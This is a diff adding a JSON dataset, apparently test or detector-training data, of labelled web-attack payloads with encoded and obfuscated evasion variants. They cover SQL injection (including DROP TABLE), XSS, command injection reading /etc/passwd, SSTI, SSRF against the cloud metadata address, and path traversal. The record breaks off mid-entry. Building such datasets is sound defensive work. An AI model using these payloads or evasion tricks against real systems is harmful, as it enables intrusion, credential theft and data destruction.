@@ -1,0 +1,1250 @@
+[
+  {
+    "id": "sqli_orig",
+    "payload": "' UNION SELECT 1,2,3--",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "original"
+  },
+  {
+    "id": "sqli_obf_url_encode_full",
+    "payload": "%27 %55%4E%49%4F%4E %53%45%4C%45%43%54 %31%2C%32%2C%33%2D%2D",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "sqli_obf_html_entity_encode",
+    "payload": "&#39; UNION SELECT 1,2,3--",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "sqli_obf_base64_encode",
+    "payload": "JyBVTklPTiBTRUxFQ1QgMSwyLDMtLQ",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "sqli_obf_url_encode_double",
+    "payload": "%2527 %2555%254E%2549%254F%254E %2553%2545%254C%2545%2543%2554 %2531%252C%2532%252C%2533%252D%252D",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "sqli_obf_hex_encode",
+    "payload": "2720554e494f4e2053454c45435420312c322c332d2d",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "sqli_obf_sql_comment_insert",
+    "payload": "' UN/*!*/ION SELE/**/CT 1,2,3--",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "sqli_obf_case_randomize",
+    "payload": "' uNiOn seLeCT 1,2,3--",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "sqli_obf_command_obfuscation",
+    "payload": "'\tUNION\tSELECT\t1,2,3--",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "sqli_combo_9",
+    "payload": "%2525%2532%2537 %2525%2535%2535%2525%2534%2545%2525%2534%2539%2525%2534%2546%2525%2534%2545 %2525%2535%2533%2525%2534%2535%2525%2534%2543%2525%2534%2535%2525%2534%2533%2525%2535%2534 %2525%2533%2531%2525%2532%2543%2525%2533%2532%2525%2532%2543%2525%2533%2533%2525%2532%2544%2525%2532%2544",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "sqli_combo_10",
+    "payload": "%2532%2537%2532%2530%2535%2535%2534%2565%2534%2539%2534%2566%2534%2565%2532%2530%2535%2533%2534%2535%2534%2563%2534%2535%2534%2533%2535%2534%2532%2530%2533%2531%2532%2563%2533%2532%2532%2563%2533%2533%2532%2564%2532%2564",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "sqli_combo_11",
+    "payload": "&#39;\tUNION\tSELECT\t1,2,3--",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "sqli_orig",
+    "payload": "' OR 1=1--",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "original"
+  },
+  {
+    "id": "sqli_obf_url_encode_full",
+    "payload": "%27 %4F%52 %31%3D%31%2D%2D",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "sqli_obf_html_entity_encode",
+    "payload": "&#39; OR 1=1--",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "sqli_obf_base64_encode",
+    "payload": "JyBPUiAxPTEtLQ==",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "sqli_obf_url_encode_double",
+    "payload": "%2527 %254F%2552 %2531%253D%2531%252D%252D",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "sqli_obf_hex_encode",
+    "payload": "27204f5220313d312d2d",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "sqli_obf_whitespace_fill",
+    "payload": "' OR 1=1 -\n-",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "sqli_obf_case_randomize",
+    "payload": "' or 1=1--",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "sqli_obf_command_obfuscation",
+    "payload": "'\tOR\t1=1--",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "sqli_combo_21",
+    "payload": "JyBPUiAxPTEtLQ==",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "sqli_combo_22",
+    "payload": "%2527 %254F%2552 %2531%253D%2531%252D%252D",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "sqli_combo_23",
+    "payload": "%254A%2579%2542%2550%2555%2569%2541%2578%2550%2554%2545%2574%254C%2551%253D%253D",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "sqli_orig",
+    "payload": "sleep(1.1)",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "original"
+  },
+  {
+    "id": "sqli_obf_url_encode_full",
+    "payload": "%73%6C%65%65%70%28%31%2E%31%29",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "sqli_obf_base64_encode",
+    "payload": "c2xlZXAoMS4xKQ",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "sqli_obf_url_encode_double",
+    "payload": "%2573%256C%2565%2565%2570%2528%2531%252E%2531%2529",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "sqli_obf_hex_encode",
+    "payload": "736c65657028312e3129",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "sqli_obf_whitespace_fill",
+    "payload": "sleep  (1.1)",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "sqli_obf_case_randomize",
+    "payload": "sLEEP(1.1)",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "sqli_combo_31",
+    "payload": "736C656570202028312E3129",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "sqli_combo_32",
+    "payload": "736c65657028312e3129",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "sqli_combo_33",
+    "payload": "sleep \t(1.1)",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "sqli_orig",
+    "payload": "'; DROP TABLE users;--",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "original"
+  },
+  {
+    "id": "sqli_obf_url_encode_full",
+    "payload": "%27%3B %44%52%4F%50 %54%41%42%4C%45 %75%73%65%72%73%3B%2D%2D",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "sqli_obf_html_entity_encode",
+    "payload": "&#39;; DROP TABLE users;--",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "sqli_obf_base64_encode",
+    "payload": "JzsgRFJPUCBUQUJMRSB1c2VyczstLQ==",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "sqli_obf_url_encode_double",
+    "payload": "%2527%253B %2544%2552%254F%2550 %2554%2541%2542%254C%2545 %2575%2573%2565%2572%2573%253B%252D%252D",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "sqli_obf_hex_encode",
+    "payload": "273b2044524f50205441424c452075736572733b2d2d",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "sqli_obf_sql_comment_insert",
+    "payload": "'; DRO/*!*/P TABLE users;--",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "sqli_obf_whitespace_fill",
+    "payload": "'; DROP TABLE users;-\n-",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "sqli_obf_case_randomize",
+    "payload": "'; droP TAblE UsERS;--",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "sqli_obf_command_obfuscation",
+    "payload": "';\tDROP\tTABLE\tusers;--",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "sqli_combo_44",
+    "payload": "JyAJOyR7SUZTfSAJRFJPUCR7SUZTfVRBQkxFJHtJICBGU311c2VyczstLQo",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "sqli_combo_45",
+    "payload": "';\tDROP\tTABLE\tusers;--",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "sqli_combo_46",
+    "payload": "\n%26%23%33%39%3B%3B %44%52%2F%2A%2A%5F%2A%2A%2F%4F%50 %54%41%42%4C%45 %75%73%65%72%73%3B%2D%2D",
+    "label": 1,
+    "attack_type": "sqli",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "xss_orig",
+    "payload": "<script>alert(1)</script>",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "original"
+  },
+  {
+    "id": "xss_obf_url_encode_full",
+    "payload": "%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "xss_obf_html_entity_encode",
+    "payload": "&lt;script&gt;alert(1)&lt;/script&gt;",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "xss_obf_base64_encode",
+    "payload": "PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "xss_obf_url_encode_double",
+    "payload": "%253C%2573%2563%2572%2569%2570%2574%253E%2561%256C%2565%2572%2574%2528%2531%2529%253C%252F%2573%2563%2572%2569%2570%2574%253E",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "xss_obf_hex_encode",
+    "payload": "3c7363726970743e616c6572742831293c2f7363726970743e",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "xss_obf_case_randomize",
+    "payload": "<sCripT>alERT(1)</sCRIPT>",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "xss_obf_js_eval_wrap",
+    "payload": "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "xss_obf_path_encoding",
+    "payload": "<script>alert(1)<%2fscript>",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "xss_combo_56",
+    "payload": "PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "xss_combo_57",
+    "payload": "%2525%2533%2543%2525%2537%2533%2525%2536%2533%2525%2537%2532%2525%2536%2539%2525%2537%2530%2525%2537%2534%2525%2533%2545%2525%2536%2531%2525%2536%2543%2525%2536%2535%2525%2537%2532%2525%2537%2534%2525%2532%2538%2525%2533%2531%2525%2532%2539%2525%2533%2543%2525%2532%2546%2525%2537%2533%2525%2536%2533%2525%2537%2532%2525%2536%2539%2525%2537%2530%2525%2537%2534%2525%2533%2545",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "xss_combo_58",
+    "payload": "%253C%2553%2563%2552%2569%2550%2554%253E%2541%254C%2565%2552%2574%2528%2531%2529%253C%252F%2573%2543%2552%2569%2550%2554%253E",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "xss_orig",
+    "payload": "<img src=x onerror=alert(1)>",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "original"
+  },
+  {
+    "id": "xss_obf_url_encode_full",
+    "payload": "%3C%69%6D%67 %73%72%63%3D%78 %6F%6E%65%72%72%6F%72%3D%61%6C%65%72%74%28%31%29%3E",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "xss_obf_html_entity_encode",
+    "payload": "&lt;img src=x onerror=alert(1)&gt;",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "xss_obf_base64_encode",
+    "payload": "PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "xss_obf_url_encode_double",
+    "payload": "%253C%2569%256D%2567 %2573%2572%2563%253D%2578 %256F%256E%2565%2572%2572%256F%2572%253D%2561%256C%2565%2572%2574%2528%2531%2529%253E",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "xss_obf_hex_encode",
+    "payload": "3c696d67207372633d78206f6e6572726f723d616c6572742831293e",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "xss_obf_whitespace_fill",
+    "payload": "<img src=x onerror\t=alert(1\t)>",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "xss_obf_case_randomize",
+    "payload": "<iMG srC=x OnERrOR=ALERT(1)>",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "xss_obf_js_eval_wrap",
+    "payload": "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "xss_obf_command_obfuscation",
+    "payload": "<img\tsrc=x\tonerror=alert(1)>",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "xss_combo_69",
+    "payload": "&lt;img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))&gt;",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "xss_combo_70",
+    "payload": "%253C%2569%256D%2567 %2573%2572%2563%253D%2578 %256F%256E%2565%2572%2572%256F%2572%253D%2561%256C%2565%2572%2574%2528%2531%2529%253E",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "xss_combo_71",
+    "payload": "<img  src=x  onerror=alert(1)>",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "xss_orig",
+    "payload": "<svg onload=alert(1)>",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "original"
+  },
+  {
+    "id": "xss_obf_url_encode_full",
+    "payload": "%3C%73%76%67 %6F%6E%6C%6F%61%64%3D%61%6C%65%72%74%28%31%29%3E",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "xss_obf_html_entity_encode",
+    "payload": "&lt;svg onload=alert(1)&gt;",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "xss_obf_base64_encode",
+    "payload": "PHN2ZyBvbmxvYWQ9YWxlcnQoMSk-",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "xss_obf_url_encode_double",
+    "payload": "%253C%2573%2576%2567 %256F%256E%256C%256F%2561%2564%253D%2561%256C%2565%2572%2574%2528%2531%2529%253E",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "xss_obf_hex_encode",
+    "payload": "3c737667206f6e6c6f61643d616c6572742831293e",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "xss_obf_whitespace_fill",
+    "payload": "<svg onload=alert  (1)>",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "xss_obf_case_randomize",
+    "payload": "<SVg OnLOAd=AlERT(1)>",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "xss_obf_js_eval_wrap",
+    "payload": "<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "xss_obf_command_obfuscation",
+    "payload": "<svg  onload=alert(1)>",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "xss_combo_82",
+    "payload": "&lt;svg onload=alert  (1)&gt;",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "xss_combo_83",
+    "payload": "<SVG oNLoAd=ALerT(1 )>",
+    "label": 1,
+    "attack_type": "xss",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "cmdi_orig",
+    "payload": "| cat /etc/passwd",
+    "label": 1,
+    "attack_type": "cmdi",
+    "param_location": "query",
+    "source": "original"
+  },
+  {
+    "id": "cmdi_obf_url_encode_full",
+    "payload": "%7C %63%61%74 %2F%65%74%63%2F%70%61%73%73%77%64",
+    "label": 1,
+    "attack_type": "cmdi",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "cmdi_obf_base64_encode",
+    "payload": "fCBjYXQgL2V0Yy9wYXNzd2Q=",
+    "label": 1,
+    "attack_type": "cmdi",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "cmdi_obf_url_encode_double",
+    "payload": "%257C %2563%2561%2574 %252F%2565%2574%2563%252F%2570%2561%2573%2573%2577%2564",
+    "label": 1,
+    "attack_type": "cmdi",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "cmdi_obf_hex_encode",
+    "payload": "7c20636174202f6574632f706173737764",
+    "label": 1,
+    "attack_type": "cmdi",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "cmdi_obf_case_randomize",
+    "payload": "| CaT /EtC/pAsswd",
+    "label": 1,
+    "attack_type": "cmdi",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "cmdi_obf_path_encoding",
+    "payload": "| cat %2fetc%2fpasswd",
+    "label": 1,
+    "attack_type": "cmdi",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "cmdi_obf_command_obfuscation",
+    "payload": "|  c'at  /etc/passwd",
+    "label": 1,
+    "attack_type": "cmdi",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "cmdi_combo_92",
+    "payload": "JTM3JTYzJTMyJTMwJTM2JTMzJTM2JTMxJTM3JTM0JTMyJTMwJTMyJTM1JTMzJTMyJTM2JTM2JTM2JTM1JTM3JTM0JTM2JTMzJTMyJTM1JTMzJTMyJTM2JTM2JTM3JTMwJTM2JTMxJTM3JTMzJTM3JTMzJTM3JTM3JTM2JTM0",
+    "label": 1,
+    "attack_type": "cmdi",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "cmdi_combo_93",
+    "payload": "%7C%24%7B%49%46%53%7D%63%27%61%74%24%7B%49%46%53%7D%2F%65%74%63%2F%70%61%73%73%77%64",
+    "label": 1,
+    "attack_type": "cmdi",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "cmdi_combo_94",
+    "payload": "fCBjYXQgJTJmZXRjJTJmcGFzc3dk",
+    "label": 1,
+    "attack_type": "cmdi",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "cmdi_orig",
+    "payload": "; ls -la",
+    "label": 1,
+    "attack_type": "cmdi",
+    "param_location": "query",
+    "source": "original"
+  },
+  {
+    "id": "cmdi_obf_url_encode_full",
+    "payload": "%3B %6C%73 %2D%6C%61",
+    "label": 1,
+    "attack_type": "cmdi",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "cmdi_obf_base64_encode",
+    "payload": "OyBscyAtbGE=",
+    "label": 1,
+    "attack_type": "cmdi",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "cmdi_obf_url_encode_double",
+    "payload": "%253B %256C%2573 %252D%256C%2561",
+    "label": 1,
+    "attack_type": "cmdi",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "cmdi_obf_hex_encode",
+    "payload": "3b206c73202d6c61",
+    "label": 1,
+    "attack_type": "cmdi",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "cmdi_obf_whitespace_fill",
+    "payload": "; ls \n-la",
+    "label": 1,
+    "attack_type": "cmdi",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "cmdi_obf_case_randomize",
+    "payload": "; ls -LA",
+    "label": 1,
+    "attack_type": "cmdi",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "cmdi_obf_command_obfuscation",
+    "payload": ";${IFS}l's${IFS}-la",
+    "label": 1,
+    "attack_type": "cmdi",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "cmdi_combo_103",
+    "payload": "%3B %6C%73 %2D%6C%61",
+    "label": 1,
+    "attack_type": "cmdi",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "cmdi_combo_104",
+    "payload": "3B206C73202D6c61",
+    "label": 1,
+    "attack_type": "cmdi",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "cmdi_combo_105",
+    "payload": " \t; ls -la",
+    "label": 1,
+    "attack_type": "cmdi",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "ssti_orig",
+    "payload": "{{7*7}}",
+    "label": 1,
+    "attack_type": "ssti",
+    "param_location": "body",
+    "source": "original"
+  },
+  {
+    "id": "ssti_obf_url_encode_full",
+    "payload": "%7B%7B%37%2A%37%7D%7D",
+    "label": 1,
+    "attack_type": "ssti",
+    "param_location": "body",
+    "source": "test_heavy"
+  },
+  {
+    "id": "ssti_obf_base64_encode",
+    "payload": "e3s3Kjd9fQ",
+    "label": 1,
+    "attack_type": "ssti",
+    "param_location": "body",
+    "source": "test_heavy"
+  },
+  {
+    "id": "ssti_obf_url_encode_double",
+    "payload": "%257B%257B%2537%252A%2537%257D%257D",
+    "label": 1,
+    "attack_type": "ssti",
+    "param_location": "body",
+    "source": "test_heavy"
+  },
+  {
+    "id": "ssti_obf_hex_encode",
+    "payload": "7b7b372a377d7d",
+    "label": 1,
+    "attack_type": "ssti",
+    "param_location": "body",
+    "source": "test_heavy"
+  },
+  {
+    "id": "ssti_obf_whitespace_fill",
+    "payload": " \t{{\t7*7}\t}",
+    "label": 1,
+    "attack_type": "ssti",
+    "param_location": "body",
+    "source": "test_heavy"
+  },
+  {
+    "id": "ssti_combo_112",
+    "payload": "7b7b372a377d7d",
+    "label": 1,
+    "attack_type": "ssti",
+    "param_location": "body",
+    "source": "test_heavy"
+  },
+  {
+    "id": "ssti_combo_113",
+    "payload": "  {{7*7} \t}",
+    "label": 1,
+    "attack_type": "ssti",
+    "param_location": "body",
+    "source": "test_heavy"
+  },
+  {
+    "id": "ssti_combo_114",
+    "payload": "%7B%7B%37%2A%37\n%7D%7D",
+    "label": 1,
+    "attack_type": "ssti",
+    "param_location": "body",
+    "source": "test_heavy"
+  },
+  {
+    "id": "ssrf_orig",
+    "payload": "http://169.254.169.254/latest/meta-data/",
+    "label": 1,
+    "attack_type": "ssrf",
+    "param_location": "query",
+    "source": "original"
+  },
+  {
+    "id": "ssrf_obf_url_encode_full",
+    "payload": "%68%74%74%70%3A%2F%2F%31%36%39%2E%32%35%34%2E%31%36%39%2E%32%35%34%2F%6C%61%74%65%73%74%2F%6D%65%74%61%2D%64%61%74%61%2F",
+    "label": 1,
+    "attack_type": "ssrf",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "ssrf_obf_base64_encode",
+    "payload": "aHR0cDovLzE2OS4yNTQuMTY5LjI1NC9sYXRlc3QvbWV0YS1kYXRhLw==",
+    "label": 1,
+    "attack_type": "ssrf",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "ssrf_obf_url_encode_double",
+    "payload": "%2568%2574%2574%2570%253A%252F%252F%2531%2536%2539%252E%2532%2535%2534%252E%2531%2536%2539%252E%2532%2535%2534%252F%256C%2561%2574%2565%2573%2574%252F%256D%2565%2574%2561%252D%2564%2561%2574%2561%252F",
+    "label": 1,
+    "attack_type": "ssrf",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "ssrf_obf_hex_encode",
+    "payload": "687474703a2f2f3136392e3235342e3136392e3235342f6c61746573742f6d6574612d646174612f",
+    "label": 1,
+    "attack_type": "ssrf",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "ssrf_obf_case_randomize",
+    "payload": "HTTp://169.254.169.254/latEsT/META-DATA/",
+    "label": 1,
+    "attack_type": "ssrf",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "ssrf_obf_path_encoding",
+    "payload": "http:%2f%2f169.254.169.254%2flatest%2fmeta-data%2f",
+    "label": 1,
+    "attack_type": "ssrf",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "ssrf_combo_122",
+    "payload": "%2561%2548%2552%2530%2563%2544%256F%256C%254D%256D%2559%256C%254D%256D%2559%2578%254E%256A%256B%2575%254D%256A%2555%2530%254C%256A%2545%2532%254F%2553%2534%2579%254E%2554%2551%256C%254D%256D%255A%2573%2559%2558%2552%256C%2563%2533%2551%256C%254D%256D%255A%2574%255A%2558%2552%2568%254C%2557%2552%2568%2564%2547%2545%256C%254D%256D%2559",
+    "label": 1,
+    "attack_type": "ssrf",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "ptrav_orig",
+    "payload": "../../etc/passwd",
+    "label": 1,
+    "attack_type": "ptrav",
+    "param_location": "query",
+    "source": "original"
+  },
+  {
+    "id": "ptrav_obf_url_encode_full",
+    "payload": "%2E%2E%2F%2E%2E%2F%65%74%63%2F%70%61%73%73%77%64",
+    "label": 1,
+    "attack_type": "ptrav",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "ptrav_obf_base64_encode",
+    "payload": "Li4vLi4vZXRjL3Bhc3N3ZA==",
+    "label": 1,
+    "attack_type": "ptrav",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "ptrav_obf_url_encode_double",
+    "payload": "%252E%252E%252F%252E%252E%252F%2565%2574%2563%252F%2570%2561%2573%2573%2577%2564",
+    "label": 1,
+    "attack_type": "ptrav",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "ptrav_obf_hex_encode",
+    "payload": "2e2e2f2e2e2f6574632f706173737764",
+    "label": 1,
+    "attack_type": "ptrav",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "ptrav_obf_case_randomize",
+    "payload": "../../etC/pAssWd",
+    "label": 1,
+    "attack_type": "ptrav",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "ptrav_obf_path_encoding",
+    "payload": "%2e%2e%2f%2e%2e%2fetc/passwd",
+    "label": 1,
+    "attack_type": "ptrav",
+    "param_location": "query",
+    "source": "test_heavy"
+  },
+  {
+    "id": "ptrav_combo_130",
